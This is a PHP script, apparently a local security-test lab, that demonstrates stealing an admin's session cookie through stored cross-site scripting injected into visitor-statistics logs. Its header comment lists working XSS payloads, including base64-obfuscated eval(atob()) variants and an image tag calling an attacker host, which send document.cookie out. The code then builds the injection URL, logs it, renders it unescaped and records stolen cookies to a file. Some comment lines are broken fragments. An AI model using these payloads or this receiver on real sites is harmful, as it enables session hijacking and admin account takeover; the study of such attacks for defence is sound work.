<?php
/*
?d=<img src='//attackerRemoteHost.com/img.jpg'> => Logs referer which can contain http://yourwebsite.com/admin/?PHPSESSID=xyz


Note ::could be injected as referal ( list top 10 referals ) or User agent ( Top 10 user agents ) or Page Url ( Top 10 Pages )
eval(atob()); // might be considered more "discrete" payload ..
Please note some attacked modify your source script in order to evaluate cookies base64 payloads in order to execute shell scripts ..

var img=,document.body.append(); ..

btoa('document.write("<img src=\'injectionStatsFileUpload.php?c="+document.cookie+";"+document.location+"\'>");')
eval(atob("ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdpbmplY3Rpb25TdGF0c0ZpbGVVcGxvYWQucGhwP2M9Iitkb2N1bWVudC5jb29raWUrIjsiK2RvY3VtZW50LmxvY2F0aW9uKyInPiIpOw"));
cu "https://php.home/securitytest/injectionStatsFileUpload.php?a=<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdpbmplY3Rpb25TdGF0c0ZpbGVVcGxvYWQucGhwP2M9Iitkb2N1bWVudC5jb29raWUrIjsiK2RvY3VtZW50LmxvY2F0aW9uKyInPiIpOw'));</script>";

url='?';btoa("var r=new XMLHttpRequest();r.open('post','"+url+"',true);request.send({'a':document.cookie+';'+document.location});");

cu "https://php.home/securitytest/injectionStatsFileUpload.php?a=<script>eval(atob('dmFyIHI9bmV3IFhNTEh0dHBSZXF1ZXN0KCk7ci5vcGVuKCdwb3N0JywnPycsdHJ1ZSk7cmVxdWVzdC5zZW5kKHsnYSc6ZG9jdW1lbnQuY29va2llKyc7Jytkb2N1bWVudC5sb2NhdGlvbn0pOw=='));</script>";#XMLRequest plus longue
#Page confirmation commande step3

btoa("var r=new XMLHttpRequest();r.open('get','?c='+document.cookie+';'+document.location,true);r.send();");

cu "https://php.home/securitytest/injectionStatsFileUpload.php?a=<script>eval(atob("dmFyIHI9bmV3IFhNTEh0dHBSZXF1ZXN0KCk7ci5vcGVuKCdnZXQnLCc/Yz0nK2RvY3VtZW50LmNvb2tpZSsnOycrZG9jdW1lbnQubG9jYXRpb24sdHJ1ZSk7ci5zZW5kKCk7"));</script>

url='?';btoa("var r=new XMLHttpRequest();r.open('post','"+url+"',true);r.setRequestHeader('Content-type','application/x-www-form-urlencoded');r.send('c='+document.cookie+';'+document.location);");
eval(atob('dmFyIHI9bmV3IFhNTEh0dHBSZXF1ZXN0KCk7ci5vcGVuKCdwb3N0JywnPycsdHJ1ZSk7ci5zZXRSZXF1ZXN0SGVhZGVyKCdDb250ZW50LXR5cGUnLCdhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQnKTtyLnNlbmQoJ2E9Jytkb2N1bWVudC5jb29raWUrJzsnK2RvY3VtZW50LmxvY2F0aW9uKTs='));
*/
$_ENV['noSecurity']=1;#otherwise response will be #404 linenumber
require_once __DIR__.'/../app/common.php';
if(XON and _POST){
    $a=1;
}


if(!$_GET and !$_POST){
    require_once $_ENV['dr'].'z/header.php';
    ?><fieldset><legend>Knock Knock : Admin Session Cookie Stoler : Step 1</legend>
Delayed CSRF :: The most common and seen kind of attack : due to poorly written wordpress / drupal / joomla plugins, some of them expose a top list of pages / referers / user_agents to the front admin dashboard without escaping any potential payload
        <form method="post">
            Url : <input name="url" value="https://php.home/securitytest/injectionStatsFileUpload.php"/><br>
<?/* todo ::
atob direct encription of
<script>document.write(\"<img src='".                                               ."'>\");</script>
*/?>
            Params : <input name="params" value='injectionStatsFileUpload.php?c="+document.cookie+";"+document.location+"'/>
            <input type="submit" value="Goto step 2 :: send payload 2 url" accesskey="s">
        </form>
    </fieldset>
    <style>
        input,textarea{width:90%}
        textarea{max-height:10vh;}
    </style>
<?_die('end step 1');}

if($_POST['params'] and 'step 2'){
    $url2=urlencode($_POST['url']."?a=<script>document.write(\"<img src='".urlencode($_POST['params'])."'>\");</script>");
    $url=$_POST['url']."?a=<script>document.write(\"<img src='".urlencode($_POST['params'])."'>\");</script>";
    echo"<textarea style='width:100%'>$url</textarea><a target=1 href=\"".addslashes($url)."\">Goto manually  to step3 if curl request fails</a> ";
    echo"then goto <a href='?step=4'>Step 4 :: Admin is Logged In</a>";
    echo'<pre>';print_r(curl($url, [],[],[],1));

} elseif($_REQUEST['a'] and 'step 3') {
    fap('visites.log', $_SERVER['REMOTE_ADDR'] . ' ' . $_SERVER['USER_AGENT'] . ' ' . $_SERVER['HTTP_REFERER'] . ' => ' . $_SERVER['REQUEST_URI'].$_POST['a']);
    #print_r($_GET);
    echo '<pre>step3 >> <a href="?step=5">Now check admin dashboard to get your session cookie stolen</a><hr>';
    _die($_REQUEST);
}

if($_REQUEST['c'] and 'step4'){
    FAP('stolencookies.log',json_encode($_REQUEST));
    echo "<pre>Stolencookie: <a href=\"?step=5\">Now check admin dashboard to get your session cookie stolen</a><hr>";
    _die($_REQUEST);
}#receiver

if ($_GET['step'] == '5' and 'adminLoggedOnStatsDashboard') {
    session_start();
    $_SESSION['adminLoggedIn'] = date('YmdHis');
    echo '<pre><a href="?step=6">Now check at step 6 the session Id cookie has been stolen</a><hr>';#readfile('visites.log');
    echo urldecode(fgc('visites.log'));_die();#==> Triggers sending document cookie to stolencookies.log
}


if ($_GET['step'] == '6' and 'check for stolen cookies') {
    echo'<pre>Step 6 :: is my cookie stolen ?<hr>';readfile('stolencookies.log');_die();
}
return;?>
